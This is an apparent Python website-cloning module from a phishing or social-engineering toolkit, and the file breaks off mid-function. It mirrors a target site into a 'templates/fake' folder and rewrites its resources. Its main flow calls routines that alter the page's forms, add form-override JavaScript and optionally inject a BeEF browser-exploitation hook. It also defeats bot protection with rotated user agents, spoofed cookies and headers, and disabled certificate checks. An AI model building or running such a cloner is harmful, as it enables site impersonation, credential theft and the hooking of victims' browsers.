import requests
import re
import os
import urllib.parse
import hashlib
import time
import random
import threading
import gzip
import brotli
import zlib
import json
import base64
import mimetypes
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from collections import defaultdict
import queue
import logging

# Try to import optional dependencies
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("⚠️ BeautifulSoup not available - using regex fallback")

try:
    from selenium import webdriver
    from selenium.webdriver.firefox.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("⚠️ Selenium not available - using requests only")

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Setup professional logging
def setup_logging():
    """Setup comprehensive logging system"""
    try:
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('pentest_clone.log'),
                logging.StreamHandler()
            ]
        )
    except Exception:
        # Fallback to basic console logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
    return logging.getLogger(__name__)

logger = setup_logging()

class PerfectBypassConfig:
    def __init__(self):
        self.reset()
        
    def reset(self):
        # Thread-safe resource caching
        self.downloaded_resources = {}
        self.failed_resources = set()
        self.in_progress = set()
        self.resource_metadata = {}
        self.download_cache_lock = threading.RLock()
        
        # Session management
        self.session_pool = []
        self.request_count = 0
        self.bypass_count = 0
        self.start_time = time.time()
        self.last_request_time = 0
        self.min_request_interval = 0.1
        
        # Resource discovery tracking
        self.discovered_resources = set()
        self.dynamic_resources = set()
        
        # Performance metrics
        self.success_rate = 0.0
        self.avg_response_time = 0.0
        
    def normalize_url(self, url, base_url):
        """Normalize URL for consistent caching with better error handling"""
        if not url:
            return None
            
        try:
            # Handle relative URLs
            if url.startswith('//'):
                scheme = urllib.parse.urlparse(base_url).scheme
                url = f"{scheme}:{url}"
            elif not url.startswith(('http://', 'https://')):
                url = urllib.parse.urljoin(base_url, url)
            
            # Remove fragments and normalize
            parsed = urllib.parse.urlparse(url)
            normalized = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Handle query parameters consistently
            if parsed.query:
                normalized += f"?{parsed.query}"
                
            return normalized
        except Exception as e:
            logger.warning(f"URL normalization failed for {url}: {e}")
            return None
    
    def get_cache_key(self, url):
        """Generate consistent cache key"""
        if not url:
            return None
        return hashlib.md5(url.encode('utf-8')).hexdigest()
        
    def should_download(self, url, base_url):
        """Thread-safe check if resource should be downloaded"""
        normalized_url = self.normalize_url(url, base_url)
        if not normalized_url:
            return False, None
            
        cache_key = self.get_cache_key(normalized_url)
        if not cache_key:
            return False, None
        
        with self.download_cache_lock:
            # Already downloaded
            if cache_key in self.downloaded_resources:
                return False, self.downloaded_resources[cache_key]
            
            # Currently downloading
            if cache_key in self.in_progress:
                return False, None
            
            # Failed before
            if cache_key in self.failed_resources:
                return False, None
            
            # Mark as in progress
            self.in_progress.add(cache_key)
            return True, normalized_url
    
    def mark_download_complete(self, url, result, base_url, metadata=None):
        """Mark download as complete with metadata"""
        normalized_url = self.normalize_url(url, base_url)
        if not normalized_url:
            return
            
        cache_key = self.get_cache_key(normalized_url)
        if not cache_key:
            return
        
        with self.download_cache_lock:
            self.in_progress.discard(cache_key)
            if result:
                self.downloaded_resources[cache_key] = result
                if metadata:
                    self.resource_metadata[cache_key] = metadata
                self.bypass_count += 1
            else:
                self.failed_resources.add(cache_key)
            self.request_count += 1
            
            # Update success rate
            if self.request_count > 0:
                self.success_rate = (self.bypass_count / self.request_count) * 100
        
    def get_rotating_user_agents(self):
        """Advanced user agent rotation with updated versions"""
        return [
            # Chrome variants (updated versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            
            # Firefox variants (updated versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
            
            # Edge variants
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
            
            # Safari variants
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
        ]
        
    def rate_limit(self):
        """Improved rate limiting with adaptive delays"""
        elapsed = time.time() - self.last_request_time
        if elapsed < self.min_request_interval:
            sleep_time = self.min_request_interval - elapsed + random.uniform(0.01, 0.05)
            time.sleep(sleep_time)
        self.last_request_time = time.time()

# Global instance
PERFECT_CONFIG = PerfectBypassConfig()

def decode_resource_content(response, resource_type, url):
    """
    Professional-grade content decoding that handles all compression types
    """
    content = response.content
    headers = response.headers
    
    # Step 1: Handle compression with comprehensive fallback
    content_encoding = headers.get('content-encoding', '').lower().strip()
    
    try:
        if 'br' in content_encoding:
            content = brotli.decompress(content)
            logger.debug(f"✅ Brotli decompressed: {len(content)} bytes")
        elif 'gzip' in content_encoding:
            content = gzip.decompress(content)
            logger.debug(f"✅ Gzip decompressed: {len(content)} bytes")
        elif 'deflate' in content_encoding:
            content = zlib.decompress(content)
            logger.debug(f"✅ Deflate decompressed: {len(content)} bytes")
        elif content_encoding and content_encoding != 'identity':
            logger.warning(f"Unknown encoding: {content_encoding}, trying fallback")
            content = smart_decompress_fallback(content)
    except Exception as e:
        logger.warning(f"⚠️ Primary decompression failed: {e}")
        # Fallback: try to detect compression by magic bytes
        content = smart_decompress_fallback(content)
    
    # Step 2: Handle text encoding for text-based resources
    if resource_type in ['css', 'js'] or is_text_resource(headers, url):
        return decode_text_content(content, headers, url)
    else:
        # Binary content (images, fonts, etc.)
        return content

def smart_decompress_fallback(content):
    """
    Fallback decompression using magic byte detection with comprehensive support
    """
    if not content or len(content) < 2:
        return content
        
    try:
        # Gzip magic bytes: 1f 8b
        if content[:2] == b'\x1f\x8b':
            logger.debug("🔍 Magic byte: Detected gzip")
            return gzip.decompress(content)
        
        # Zlib/deflate magic bytes: 78 (various second bytes)
        elif content[0:1] == b'\x78' and len(content) > 1:
            second_byte = content[1]
            if second_byte in [0x01, 0x5e, 0x9c, 0xda]:  # Common zlib second bytes
                logger.debug("🔍 Magic byte: Detected zlib/deflate")
                return zlib.decompress(content)
        
        # Try brotli (no consistent magic bytes, so attempt decompression)
        elif len(content) > 10:
            try:
                result = brotli.decompress(content)
                logger.debug("🔍 Magic byte: Detected brotli")
                return result
            except Exception:
                pass
                
    except Exception as e:
        logger.debug(f"⚠️ Magic byte decompression failed: {e}")
    
    return content

def decode_text_content(content, headers, url):
    """
    Enhanced text content decoding with comprehensive charset detection
    """
    # Step 1: Try to get charset from Content-Type header
    content_type = headers.get('content-type', '').lower()
    charset = None
    
    if 'charset=' in content_type:
        try:
            charset = content_type.split('charset=')[1].split(';')[0].strip()
        except Exception:
            pass
    
    # Step 2: Build encoding priority list
    encodings_to_try = []
    
    if charset:
        encodings_to_try.append(charset)
    
    # Common web encodings in priority order
    encodings_to_try.extend([
        'utf-8',
        'iso-8859-1',
        'cp1252',
        'latin1',
        'ascii'
    ])
    
    # Step 3: Try each encoding
    for encoding in encodings_to_try:
        try:
            decoded = content.decode(encoding)
            # Validate that it's actually readable text
            if is_valid_text_content(decoded, url):
                logger.debug(f"✅ Text decoded with {encoding}: {len(decoded)} chars")
                return decoded
        except (UnicodeDecodeError, LookupError):
            continue
    
    # Final fallback: decode with errors='ignore'
    try:
        decoded = content.decode('utf-8', errors='ignore')
        logger.warning(f"⚠️ Fallback UTF-8 decoding used for {os.path.basename(url)}")
        return decoded
    except Exception:
        logger.error(f"❌ All text decoding failed for {os.path.basename(url)}")
        return content

def is_text_resource(headers, url):
    """Determine if a resource should be treated as text"""
    content_type = headers.get('content-type', '').lower()
    
    # Check content-type header
    text_types = [
        'text/', 'application/javascript', 'application/json',
        'application/xml', 'application/xhtml+xml'
    ]
    
    if any(t in content_type for t in text_types):
        return True
    
    # Check file extension
    text_extensions = ['.css', '.js', '.json', '.xml', '.html', '.htm', '.txt']
    try:
        parsed_url = urllib.parse.urlparse(url)
        path = parsed_url.path.lower()
        return any(path.endswith(ext) for ext in text_extensions)
    except Exception:
        return False

def is_valid_text_content(text, url):
    """
    Validate that decoded content is actually readable text with comprehensive checks
    """
    if not text or len(text) < 10:
        return False
    
    # Check for excessive control characters (indicates binary data)
    sample = text[:min(2000, len(text))]  # Check first 2KB
    control_chars = sum(1 for c in sample if ord(c) < 32 and c not in '\r\n\t')
    if control_chars > len(sample) * 0.1:  # More than 10% control chars
        return False
    
    # Resource-specific validation
    try:
        url_lower = url.lower()
        text_lower = text.lower()
        
        if '.css' in url_lower or 'text/css' in url_lower:
            # CSS should contain common CSS patterns
            css_indicators = ['{', '}', ':', ';', 'color', 'font', 'margin', 'padding', 'background']
            if not any(indicator in text_lower for indicator in css_indicators):
                return False
        
        elif '.js' in url_lower or 'javascript' in url_lower:
            # JS should contain common JS patterns
            js_indicators = ['function', 'var ', 'let ', 'const ', 'return', 'if', 'for', 'while']
            if not any(indicator in text for indicator in js_indicators):
                return False
    except Exception:
        pass  # If validation fails, assume it's valid
    
    return True

def validate_resource_integrity(content, resource_type, url, response_headers=None):
    """
    Validate that downloaded content is not an error page or blocked content
    """
    if not content:
        return False, "Empty content"
    
    # Convert to string for text analysis if needed
    try:
        if isinstance(content, bytes):
            text_content = content.decode('utf-8', errors='ignore')[:5000]  # First 5KB
        else:
            text_content = str(content)[:5000]
    except Exception:
        return True, "Binary content - skipping text validation"
    
    # Check for common blocking patterns
    blocking_indicators = [
        'access denied', 'forbidden', 'not authorized', 'blocked',
        'captcha', 'cloudflare', 'rate limit', 'too many requests',
        'bot detection', 'suspicious activity', 'security check',
        'please verify', 'human verification', 'ddos protection'
    ]
    
    text_lower = text_content.lower()
    for indicator in blocking_indicators:
        if indicator in text_lower:
            return False, f"Blocked content detected: {indicator}"
    
    # Check for HTTP error pages in content
    error_patterns = [
        '404 not found', '403 forbidden', '500 internal server error',
        '502 bad gateway', '503 service unavailable', '429 too many requests'
    ]
    
    for pattern in error_patterns:
        if pattern in text_lower:
            return False, f"Error page detected: {pattern}"
    
    # Resource-specific validation
    try:
        if resource_type == 'css':
            if len(text_content) > 200 and not any(x in text_content for x in ['{', '}', ':', ';']):
                return False, "Invalid CSS content structure"
        
        elif resource_type == 'js':
            if len(text_content) > 200 and not any(x in text_content for x in ['function', 'var', 'let', 'const', '(', ')', '{']):
                return False, "Invalid JavaScript content structure"
    except Exception:
        pass  # If validation fails, assume it's valid
    
    # Check content length vs expected
    if response_headers:
        content_length = response_headers.get('content-length')
        if content_length:
            try:
                expected_length = int(content_length)
                actual_length = len(content) if isinstance(content, (str, bytes)) else 0
                # Allow some variance for compression/decompression
                if expected_length > 1000 and actual_length < expected_length * 0.1:
                    return False, f"Content too small: expected {expected_length}, got {actual_length}"
            except (ValueError, TypeError):
                pass
    
    return True, "Valid content"

def enhanced_content_type_detection(response, url):
    """
    Better content type detection for edge cases with fallback mechanisms
    """
    content_type = response.headers.get('content-type', '').lower()
    
    # Override based on URL if content-type is generic or missing
    if not content_type or any(generic in content_type for generic in [
        'text/plain', 'application/octet-stream', 'binary/octet-stream'
    ]):
        # Use mimetypes module for better detection
        try:
            guessed_type, _ = mimetypes.guess_type(url)
            if guessed_type:
                return guessed_type
        except Exception:
            pass
        
        # Manual extension mapping for common cases
        try:
            url_lower = url.lower()
            if url_lower.endswith('.css'):
                return 'text/css'
            elif url_lower.endswith('.js'):
                return 'application/javascript'
            elif any(url_lower.endswith(ext) for ext in ['.woff', '.woff2', '.ttf', '.otf']):
                return 'font/woff2'
            elif any(url_lower.endswith(ext) for ext in ['.jpg', '.jpeg']):
                return 'image/jpeg'
            elif any(url_lower.endswith(ext) for ext in ['.png', '.gif', '.svg', '.webp']):
                return f'image/{url_lower.split(".")[-1]}'
        except Exception:
            pass
    
    return content_type

def save_resource_with_perfect_handling(response, url, clone_env, resource_type):
    """
    FINAL: Professional-grade resource saving with comprehensive error handling
    """
    try:
        start_time = time.time()
        logger.debug(f"🔄 Processing {resource_type}: {os.path.basename(url)}")
        
        # Step 1: Detect actual content type
        detected_content_type = enhanced_content_type_detection(response, url)
        
        # Step 2: Properly decode content based on type and compression
        content = decode_resource_content(response, resource_type, url)
        
        if content is None:
            logger.error(f"❌ Failed to decode content for: {os.path.basename(url)}")
            return None
        
        # Step 3: Validate content integrity
        is_valid, validation_msg = validate_resource_integrity(
            content, resource_type, url, response.headers
        )
        
        if not is_valid:
            logger.warning(f"⚠️ Content validation failed for {os.path.basename(url)}: {validation_msg}")
            # Continue anyway - might still be usable
        
        # Step 4: Generate safe filename
        filename = generate_safe_filename(url, detected_content_type)
        
        # Step 5: Determine appropriate subdirectory
        subdir = get_resource_subdir(resource_type, filename)
        local_path = f"{subdir}/{filename}"
        full_path = f"{clone_env['output_dir']}/{local_path}"
        
        # Step 6: Ensure directory exists
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        
        # Step 7: Save content with proper handling
        if resource_type in ['css', 'js'] or is_text_resource(response.headers, url):
            # Text content - process and save as UTF-8
            if isinstance(content, bytes):
                content = content.decode('utf-8', errors='ignore')
            
            # Process CSS for URL rewriting
            if resource_type == 'css':
                content = process_css_urls(content, url, clone_env)
            
            # Save as text
            with open(full_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            
            logger.info(f"✅ Text resource saved: {len(content)} chars - {os.path.basename(filename)}")
            
        else:
            # Binary content (images, fonts, etc.)
            if isinstance(content, str):
                content = content.encode('utf-8')
            
            with open(full_path, 'wb') as f:
                f.write(content)
            
            logger.info(f"✅ Binary resource saved: {len(content)} bytes - {os.path.basename(filename)}")
        
        # Step 8: Store metadata
        processing_time = time.time() - start_time
        metadata = {
            'original_url': url,
            'content_type': detected_content_type,
            'size': len(content),
            'processing_time': processing_time,
            'validation_result': validation_msg,
            'timestamp': time.time()
        }
        
        return local_path, metadata
        
    except Exception as e:
        logger.error(f"❌ Save failed for {os.path.basename(url)}: {e}")
        import traceback
        logger.debug(traceback.format_exc())
        return None

def process_css_urls(css_content, css_url, clone_env):
    """
    FINAL: Enhanced CSS processing with comprehensive URL handling and error recovery
    """
    if not css_content:
        return css_content

    original_length = len(css_content)
    
    try:
        # Handle @import with enhanced bypass
        import_pattern = r'@import\s+(?:url\()?\s*["\']?([^"\'();\s]+)["\']?\s*\)?[^;]*;'
        def replace_import(match):
            import_url = match.group(1)
            if validate_resource_url(import_url, clone_env['base_url']):
                try:
                    # Try to download the imported CSS
                    should_download, normalized_or_cached = PERFECT_CONFIG.should_download(
                        import_url, clone_env['base_url']
                    )
                    if should_download:
                        result = download_resource_with_retry(normalized_or_cached, clone_env, 'css')
                        local_path = result[0] if result and isinstance(result, tuple) else result
                        metadata = result[1] if result and isinstance(result, tuple) else None
                        PERFECT_CONFIG.mark_download_complete(
                            import_url, local_path, clone_env['base_url'], metadata
                        )
                    else:
                        local_path = normalized_or_cached
                        
                    if local_path:
                        return match.group(0).replace(import_url, f"../{local_path}")
                except Exception as e:
                    logger.warning(f"Failed to process CSS import {import_url}: {e}")
            return match.group(0)

        css_content = re.sub(import_pattern, replace_import, css_content, flags=re.IGNORECASE)

        # Handle url() references with enhanced bypass
        url_pattern = r'url\(\s*["\']?([^"\'()]+)["\']?\s*\)'
        def replace_url(match):
            url_ref = match.group(1)
            if validate_resource_url(url_ref, clone_env['base_url']):
                try:
                    # Determine resource type
                    if any(ext in url_ref.lower() for ext in ['.woff', '.woff2', '.ttf', '.otf', '.eot']):
                        res_type = 'font'
                    elif any(ext in url_ref.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp', '.ico']):
                        res_type = 'image'
                    else:
                        res_type = 'asset'

                    # Try to download the referenced resource
                    should_download, normalized_or_cached = PERFECT_CONFIG.should_download(
                        url_ref, clone_env['base_url']
                    )
                    if should_download:
                        result = download_resource_with_retry(normalized_or_cached, clone_env, res_type)
                        local_path = result[0] if result and isinstance(result, tuple) else result
                        metadata = result[1] if result and isinstance(result, tuple) else None
                        PERFECT_CONFIG.mark_download_complete(
                            url_ref, local_path, clone_env['base_url'], metadata
                        )
                    else:
                        local_path = normalized_or_cached
                        
                    if local_path:
                        return f'url(../{local_path})'
                except Exception as e:
                    logger.warning(f"Failed to process CSS url() reference {url_ref}: {e}")
            return match.group(0)

        css_content = re.sub(url_pattern, replace_url, css_content, flags=re.IGNORECASE)
        
        logger.debug(f"CSS processing: {original_length} -> {len(css_content)} chars")
        return css_content
        
    except Exception as e:
        logger.error(f"CSS processing failed: {e}")
        return css_content  # Return original content on error

def download_resource_with_retry(resource_url, clone_env, resource_type, timeout=30):
    """
    FINAL: Enhanced resource download with comprehensive error handling and retry logic
    """
    if not resource_url:
        return None

    try:
        # Rate limiting
        PERFECT_CONFIG.rate_limit()
        
        logger.debug(f"🔽 Downloading {resource_type}: {os.path.basename(resource_url)}")
        
        # Enhanced retry with different strategies
        result = retry_download_with_strategies(resource_url, clone_env, resource_type, max_attempts=3)
        
        if result:
            logger.info(f"✅ Download success: {os.path.basename(resource_url)}")
            return result
        else:
            logger.warning(f"❌ Download failed: {os.path.basename(resource_url)}")
            return None
            
    except Exception as e:
        logger.error(f"❌ Download exception for {os.path.basename(resource_url)}: {e}")
        return None

def retry_download_with_strategies(url, clone_env, resource_type, max_attempts=3):
    """
    FINAL: Enhanced retry logic with different strategies per attempt
    """
    for attempt in range(max_attempts):
        try:
            logger.debug(f"🔄 Attempt {attempt + 1}/{max_attempts} for: {os.path.basename(url)}")
            
            # Use different session for each attempt
            session = clone_env['sessions'][attempt % len(clone_env['sessions'])]
            
            # Progressive timeout (start fast, get slower)
            timeout = 15 + (attempt * 15)  # 15s, 30s, 45s
            
            # Different headers for each attempt
            headers = create_headers_for_resource(session, resource_type, url, clone_env, attempt)
            
            # Make request with comprehensive error handling
            start_time = time.time()
            response = session.get(
                url, 
                headers=headers, 
                timeout=timeout, 
                verify=False, 
                allow_redirects=True,
                stream=False
            )
            response_time = time.time() - start_time
            
            # Update average response time
            if PERFECT_CONFIG.request_count > 0:
                PERFECT_CONFIG.avg_response_time = (
                    (PERFECT_CONFIG.avg_response_time * PERFECT_CONFIG.request_count + response_time) / 
                    (PERFECT_CONFIG.request_count + 1)
                )
            else:
                PERFECT_CONFIG.avg_response_time = response_time
            
            # Check for success
            if response.status_code == 200:
                logger.debug(f"✅ HTTP 200 on attempt {attempt + 1}: {os.path.basename(url)}")
                
                # Log compression info
                content_encoding = response.headers.get('content-encoding', 'none')
                content_type = response.headers.get('content-type', 'unknown')
                content_length = len(response.content)
                
                logger.debug(f"📊 Response - Encoding: {content_encoding}, Type: {content_type}, Size: {content_length}")
                
                # Save with comprehensive error handling
                result = save_resource_with_perfect_handling(response, url, clone_env, resource_type)
                if result:
                    return result
                else:
                    logger.warning(f"⚠️ Save failed on attempt {attempt + 1}")
                    
            else:
                logger.warning(f"⚠️ HTTP {response.status_code} on attempt {attempt + 1}")
                
        except requests.exceptions.Timeout:
            logger.warning(f"⏰ Timeout on attempt {attempt + 1}: {os.path.basename(url)}")
        except requests.exceptions.ConnectionError:
            logger.warning(f"🔌 Connection error on attempt {attempt + 1}: {os.path.basename(url)}")
        except Exception as e:
            logger.warning(f"❌ Attempt {attempt + 1} failed: {e}")
            
        # Wait between attempts with exponential backoff
        if attempt < max_attempts - 1:
            wait_time = (2 ** attempt) + random.uniform(0.5, 1.5)
            logger.debug(f"⏳ Waiting {wait_time:.1f}s before retry...")
            time.sleep(wait_time)
    
    logger.error(f"❌ All {max_attempts} attempts failed for: {os.path.basename(url)}")
    return None

def create_headers_for_resource(session, resource_type, url, clone_env, attempt=0):
    """
    FINAL: Create robust headers that work across different websites
    """
    base_headers = {
        'User-Agent': session.headers.get('User-Agent'),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'DNT': '1',
    }
    
    # Referer strategy based on attempt
    try:
        if attempt == 0:
            # First attempt: use the main page as referer
            base_headers['Referer'] = clone_env['url']
        elif attempt == 1:
            # Second attempt: use the resource's directory as referer
            base_headers['Referer'] = '/'.join(url.split('/')[:-1]) + '/'
        # Third attempt: no referer (more stealthy)
    except Exception:
        pass
    
    # Resource-specific Accept headers
    accept_headers = {
        'css': 'text/css,*/*;q=0.1',
        'js': '*/*',
        'image': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'font': 'font/woff2,font/woff,*/*;q=0.1',
        'asset': '*/*'
    }
    
    base_headers['Accept'] = accept_headers.get(resource_type, '*/*')
    
    # Add modern browser headers for better compatibility
    user_agent = base_headers.get('User-Agent', '')
    if 'Chrome' in user_agent:
        try:
            base_headers.update({
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="122", "Google Chrome";v="122"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'Sec-Fetch-Dest': {
                    'css': 'style',
                    'js': 'script', 
                    'image': 'image',
                    'font': 'font'
                }.get(resource_type, 'empty'),
                'Sec-Fetch-Mode': 'no-cors',
                'Sec-Fetch-Site': 'same-origin'
            })
        except Exception:
            pass
    
    return base_headers

def process_resources_with_perfect_handling(html_content, clone_env, beef, driver=None):
    """
    FINAL: Enhanced content processing with professional-grade resource handling
    """
    if not BS4_AVAILABLE:
        return process_regex_bypass(html_content, beef)

    soup = BeautifulSoup(html_content, 'html.parser')

    # Enhanced parallel resource downloading with optimal threading
    max_workers = min(3, (os.cpu_count() or 1))  # Conservative for stability
    logger.info(f"🧵 Using {max_workers} worker threads for resource processing")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Enhanced resource discovery
        resource_patterns = discover_all_resources(soup, clone_env['base_url'])
        
        # Add dynamic resources
        for dynamic_url in PERFECT_CONFIG.dynamic_resources:
            if validate_resource_url(dynamic_url, clone_env['base_url']):
                resource_patterns.append((dynamic_url, None, None, 'dynamic'))
        
        logger.info(f"🔍 Found {len(resource_patterns)} resources to process")
        
        # Submit download tasks
        future_to_resource = {}
        for resource_url, element, attr, resource_type in resource_patterns:
            should_download, normalized_or_cached = PERFECT_CONFIG.should_download(
                resource_url, clone_env['base_url']
            )
            
            if not should_download:
                # Use cached result if available
                if normalized_or_cached and element and attr:
                    element[attr] = normalized_or_cached
                continue
            
            future = executor.submit(
                download_resource_with_retry,
                normalized_or_cached,
                clone_env,
                resource_type
            )
            future_to_resource[future] = (element, attr, resource_url)

        # Process downloads with comprehensive error handling
        completed_count = 0
        for future in as_completed(future_to_resource, timeout=600):  # 10 minute total timeout
            try:
                result = future.result(timeout=10)  # 10 second per-result timeout
                element, attr, original_url = future_to_resource[future]
                
                # Handle result (can be tuple with metadata or just path)
                if result:
                    if isinstance(result, tuple):
                        local_path, metadata = result
                        PERFECT_CONFIG.mark_download_complete(
                            original_url, local_path, clone_env['base_url'], metadata
                        )
                    else:
                        local_path = result
                        PERFECT_CONFIG.mark_download_complete(
                            original_url, local_path, clone_env['base_url']
                        )
                    
                    if local_path and element and attr:
                        element[attr] = local_path
                else:
                    PERFECT_CONFIG.mark_download_complete(original_url, None, clone_env['base_url'])
                
                completed_count += 1
                if completed_count % 5 == 0:
                    success_rate = PERFECT_CONFIG.success_rate
                    logger.info(f"📊 Progress: {completed_count}/{len(future_to_resource)} resources ({success_rate:.1f}% success)")
                    
            except TimeoutError:
                element, attr, original_url = future_to_resource[future]
                logger.warning(f"⏰ Future timeout: {os.path.basename(original_url)}")
                PERFECT_CONFIG.mark_download_complete(original_url, None, clone_env['base_url'])
            except Exception as e:
                element, attr, original_url = future_to_resource[future]
                logger.error(f"❌ Future processing error for {os.path.basename(original_url)}: {e}")
                PERFECT_CONFIG.mark_download_complete(original_url, None, clone_env['base_url'])

    # Continue with form processing, BeEF injection, etc.
    process_forms_for_pentesting(soup)
    add_form_override_javascript(soup)
    
    if beef == 'yes':
        add_beef_hook(soup)

    logger.info(f"✅ Resource processing completed. Success rate: {PERFECT_CONFIG.success_rate:.1f}%")
    return str(soup)

# MAIN CLONE FUNCTION
def clone(url, user_agent, beef):
    """
    FINAL: Enhanced universal website cloner with professional-grade resource handling
    """
    global PERFECT_CONFIG

    # Validate inputs
    if not url or not isinstance(url, str):
        logger.error("❌ Invalid URL provided")
        return False
        
    if not url.startswith(('http://', 'https://')):
        logger.error("❌ URL must start with http:// or https://")
        return False

    # Reset for fresh clone
    PERFECT_CONFIG.reset()
    driver = None

    try:
        logger.info(f"🚀 Starting PERFECT universal clone: {url}")

        # Setup perfect bypass environment
        clone_env = setup_clone_environment(url, user_agent)
        if not clone_env:
            return False

        # Get content with perfect bypass
        html_content, driver = get_page_content(url, clone_env)
        if not html_content:
            logger.error("❌ Failed to retrieve content")
            return False

        logger.info(f"✅ Content retrieved: {len(html_content)} characters")

        # Enhanced: Discover dynamic resources if using Selenium
        if driver:
            dynamic_resources = discover_dynamic_resources(driver, clone_env['base_url'])
            PERFECT_CONFIG.dynamic_resources.update(dynamic_resources)
            logger.info(f"🔍 Discovered {len(dynamic_resources)} dynamic resources")

        # Process with enhanced bypass techniques (USING FINAL VERSION)
        final_html = process_resources_with_perfect_handling(html_content, clone_env, beef, driver)

        # Save with perfect structure
        success = save_complete_clone(final_html, clone_env)

        if success:
            logger.info(f"🎯 PERFECT clone completed: {clone_env['output_dir']}")
            logger.info(f"📊 Resources downloaded: {len(PERFECT_CONFIG.downloaded_resources)}")
            logger.info(f"🔥 Bypass success: {PERFECT_CONFIG.bypass_count} advanced bypasses")
            logger.info(f"⚡ Success rate: {PERFECT_CONFIG.success_rate:.1f}%")
            logger.info(f"🕒 Average response time: {PERFECT_CONFIG.avg_response_time:.2f}s")
            return True

        return False

    except Exception as e:
        logger.error(f"❌ Perfect cloning failed: {e}")
        import traceback
        logger.debug(traceback.format_exc())
        return False
    finally:
        # Cleanup resources
        if driver:
            try:
                driver.quit()
                logger.debug("🧹 Driver cleanup completed")
            except Exception as e:
                logger.warning(f"Warning: Driver cleanup failed: {e}")

# HELPER FUNCTIONS (ALL REMAINING FUNCTIONS)

def setup_clone_environment(url, user_agent):
    """Setup perfect bypass environment with enhanced structure"""
    try:
        parsed_url = urllib.parse.urlparse(url)
        if not parsed_url.netloc:
            logger.error("❌ Invalid URL format")
            return None
            
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        # Generate perfect identifiers
        domain = re.sub(r'[^\w\-.]', '', parsed_url.netloc)
        ua_clean = re.sub(r'[^\w\-.]', '_', user_agent)
        output_dir = f'templates/fake/{ua_clean}/{domain}'

        # Create comprehensive directory structure
        directories = [
            'css', 'js', 'images', 'fonts', 'assets', 'static', 'media',
            'api', 'data', 'resources', 'vendor', 'libs', 'plugins', 'bypass'
        ]

        for directory in directories:
            dir_path = f'{output_dir}/{directory}'
            os.makedirs(dir_path, exist_ok=True)

        # Create enhanced session pool
        sessions = create_session_pool(user_agent, base_url, parsed_url.netloc)

        return {
            'url': url,
            'base_url': base_url,
            'domain': parsed_url.netloc,
            'output_dir': output_dir,
            'sessions': sessions,
            'primary_session': sessions[0],
            'user_agent': user_agent
        }
        
    except Exception as e:
        logger.error(f"❌ Environment setup failed: {e}")
        return None

def create_session_pool(user_agent, base_url, domain):
    """Create enhanced session pool with better management"""
    sessions = []
    user_agents = PERFECT_CONFIG.get_rotating_user_agents()
    
    # Create 3 different bypass sessions
    for i in range(3):
        session = requests.Session()
        current_ua = user_agents[i % len(user_agents)]
        
        # Enhanced bypass headers with rotation
        bypass_headers = create_bypass_headers(current_ua, domain, i)
        session.headers.update(bypass_headers)
        
        # Enhanced session configuration
        session.verify = False
        session.timeout = 30
        session.max_redirects = 10
        
        # Add advanced cookie spoofing
        add_bypass_cookies(session, domain, i)
        
        # Configure advanced retry strategy
        configure_session_retries(session)
        
        sessions.append(session)
        PERFECT_CONFIG.session_pool.append(session)
    
    return sessions

def create_bypass_headers(user_agent, domain, session_id):
    """Create advanced bypass headers that defeat most protections"""
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': random.choice([
            'en-US,en;q=0.9,es;q=0.8',
            'en-GB,en;q=0.9,fr;q=0.8', 
            'en-US,en;q=0.9,de;q=0.8',
            'en-CA,en;q=0.9,zh;q=0.8'
        ]),
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
